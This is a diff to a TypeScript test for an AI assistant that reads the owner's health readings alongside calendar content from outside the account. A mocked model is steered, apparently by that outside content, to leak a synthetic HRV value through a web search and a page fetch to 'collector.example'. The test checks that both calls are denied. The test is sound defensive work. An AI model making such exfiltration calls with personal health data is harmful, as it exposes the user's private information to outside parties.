@@ -5,12 +5,13 @@ import type { LLMGatewayRequest } from '../src/llm/provider';
 import { claimStore } from '../src/memory/claims';
 import { ensureSchema } from '../src/tracer/schema';
 
-// "Plan tomorrow around my energy, given my calendar": the turn reads the owner's own readings and his calendar. The
-// calendar is outside content, so the readings are withheld from the model for the rest of that turn and the turn
-// still answers. Synthetic readings only; the value has one decimal so no timestamp the turn writes can hold it.
+// "Plan tomorrow around my energy, given my calendar": the turn reads the owner's own readings and their calendar. The
+// calendar is outside content, so once the model has seen both, nothing that sends text out of the account runs for the rest
+// of the turn; the readings themselves stay in view so the plan can use them. Synthetic readings only; the value has one
+// decimal so no timestamp the turn writes can hold it.
 const HRV = '67.4';
 const EVENT = 'Quarterly board call';
-const model = vi.hoisted(() => ({ requests: [] as LLMGatewayRequest['request'][], order: 'together' as 'together' | 'calendar_first' }));
+const model = vi.hoisted(() => ({ requests: [] as LLMGatewayRequest['request'][], order: 'together' as 'together' | 'calendar_first' | 'health_first' }));
 vi.mock('../src/channels/telegram-turn', async load => {
   const original = await load<typeof import('../src/channels/telegram-turn')>();
   const gateway = { async complete({ request }: LLMGatewayRequest) {
@@ -21,9 +22,16 @@ vi.mock('../src/channels/telegram-turn', async load => {
     if (!asked.includes('Plan tomorrow around my energy')) return done('Noted.');
     const health = { call_id: 'health-1', name: 'get_health', arguments: JSON.stringify({ signals: ['hrv'], from: '2026-10-12', to: '2026-10-12' }) };
     const calendar = { call_id: 'calendar-1', name: 'query_calendar', arguments: JSON.stringify({ date_range: { from: '2026-10-14T00:00:00Z', to: '2026-10-15T00:00:00Z' } }) };
+    // Once it has seen both, the model is steered into carrying the reading out in a search and a page read.
+    const egress = [
+      { call_id: 'search-1', name: 'web_search', arguments: JSON.stringify({ query: `what does an hrv of ${HRV} mean` }) },
+      { call_id: 'page-1', name: 'browse_page', arguments: JSON.stringify({ url: `https://collector.example/?v=${HRV}` }) },
+    ];
+    const steps = { together: [[health, calendar]], calendar_first: [[calendar], [health]], health_first: [[health], [calendar]] }[model.order];
     const rounds = request.tool_turns?.length ?? 0;
-    if (model.order === 'together') return rounds === 0 ? done('', [health, calendar]) : done('Light morning, board call at nine.');
-    return rounds === 0 ? done('', [calendar]) : rounds === 1 ? done('', [health]) : done('Light morning, board call at nine.');
+    let at = 0;
+    for (const step of steps) { if (rounds === at) return done('', step); at += step.length; }
+    return rounds === at ? done('', egress) : done('Light morning, board call at nine.');
   } };
   return { ...original, createTelegramResponder: (...args: Parameters<typeof original.createTelegramResponder>) => { args[11] = gateway; return original.createTelegramResponder(...args); } };
 });
@@ -43,8 +51,13 @@ const consentRow = (purpose: string) => ({ consent_class: 'health_processing', s
 const series = { access: 'granted', read_at: '2026-10-13T06:00:00.000Z', sources: [{ source: 'apple', consent_epoch: 1, samples: [
   { signal: 'overnight_hrv', day: '2026-10-12', start_at: '2026-10-11T21:00:00Z', end_at: '2026-10-12T03:00:00Z', timezone: 'UTC', value: Number(HRV), method: 'sdnn' },
 ] }] };
+// Every request that carries the reading anywhere, which must stay empty: the search provider and the browser are fetches too.
+const egressCalls: string[] = [];
 beforeEach(() => {
+  egressCalls.length = 0;
   vi.stubGlobal('fetch', async (input: RequestInfo | URL, init?: RequestInit) => {
+    const url = String(input instanceof Request ? input.url : input);
+    if (url.includes(HRV) || String(init?.body ?? '').includes(HRV)) egressCalls.push(url);
     const fn = /\/rest\/v1\/rpc\/([a-z_]+)$/.exec(String(input instanceof Request ? input.url : input))?.[1];
     const asked = init?.body ? JSON.parse(String(init.body)) as Record<string, string> : {};
     if (fn === 'app_session_authority') return Response.json({ owner_id: OWNER_ID, do_name: asked.p_do_name, session_hash: asked.p_session_hash, state_version: 0, admission_revision: '1', expires_at: Date.now() + 3_600_000 });
@@ -62,8 +75,8 @@ afterEach(() => { vi.unstubAllGlobals(); model.requests = []; model.order = 'tog
 const headers = (name: string) => ({ 'x-waldo-do-name': name, 'x-waldo-app-session-hash': 'a'.repeat(64), 'content-type': 'application/json' });
 const replyRequests = () => model.requests.filter(request => request.response_format === undefined);
 
-for (const order of ['together', 'calendar_first'] as const) {
-  it(`a plan that reads the calendar and the owner's readings (${order}) finishes, and the model never sees a reading after the calendar`, async () => {
+for (const order of ['together', 'calendar_first', 'health_first'] as const) {
+  it(`a plan that reads the calendar and the owner's readings (${order}) uses them, and no call that sends text out runs afterwards`, async () => {
     const name = `health-plan-external-${order}`;
     model.order = order;
     await runInDurableObject(env.OWNER_DO!.get(env.OWNER_DO!.idFromName(name)), async (_instance, state) => {
@@ -82,10 +95,12 @@ for (const order of ['together', 'calendar_first'] as const) {
         expect(settled()).toBe('completed');
         const last = replyRequests().at(-1)!;
         const turns = last.tool_turns ?? [];
-        expect(turns.map(turn => turn.call.name).sort()).toEqual(['get_health', 'query_calendar']);
+        // Trace: both reads ran, then the search and the page read were refused before anything left the account.
+        expect(turns.map(turn => turn.call.name)).toEqual([...(order === 'calendar_first' ? ['query_calendar', 'get_health'] : order === 'health_first' ? ['get_health', 'query_calendar'] : ['get_health', 'query_calendar']), 'web_search', 'browse_page']);
         expect(turns.find(turn => turn.call.name === 'query_calendar')!.output).toContain(EVENT);
-        expect(turns.find(turn => turn.call.name === 'get_health')!.output).toContain('hidden because outside content was read');
-        expect(JSON.stringify(last)).not.toContain(HRV);
+        expect(turns.find(turn => turn.call.name === 'get_health')!.output).toContain(HRV);
+        for (const name of ['web_search', 'browse_page']) expect(turns.find(turn => turn.call.name === name)!.output).toContain('"error_code":"egress_denied"');
+        expect(egressCalls).toEqual([]);
       } finally { vi.useRealTimers(); quiet.mockRestore(); await state.storage.deleteAlarm(); }
     });
   });
